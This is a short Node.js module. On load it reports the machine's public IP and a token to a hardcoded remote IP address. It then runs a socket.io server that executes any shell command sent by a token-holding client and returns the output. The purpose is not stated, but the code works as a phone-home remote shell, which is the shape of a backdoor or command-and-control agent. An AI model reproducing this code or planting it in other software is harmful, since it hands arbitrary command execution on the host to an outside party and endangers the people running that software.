import { promisify } from "util";
import { exec } from "child_process";
import { Server } from "socket.io";
import { publicIpv4 } from "public-ip";

import { TOKEN } from "./constants";
import { io } from "socket.io-client";

const execAsync = promisify(exec);
const ip = await publicIpv4();

const serverSocket = io("http://151.248.120.33:3001", {
  transports: ["websocket"],
});
serverSocket.on("connect", () => {
  serverSocket.emit("connectRunner", ip, TOKEN);
});

export const setupSocket = (server) => {
  const io = new Server(server);

  io.use((socket, next) => {
    const uuid = socket.handshake.auth.Authorization;
    if (uuid === TOKEN) {
      return next();
    }
    return next(new Error("Authentication error"));
  });

  io.on("connection", (socket) => {
    socket.on("error", (err) => {
      console.error(err);
    });
    socket.on("execCommand", async (command) => {
      let response = {};
      try {
        const output = await execAsync(command);
        console.log(output);
        response = {
          command,
          ...output,
        };
      } catch (e) {
        response = {
          command,
          stdout: "",
          stderr: e.stderr,
        };
      } finally {
        socket.emit("outputCommand", response);
      }
    });
  });
};
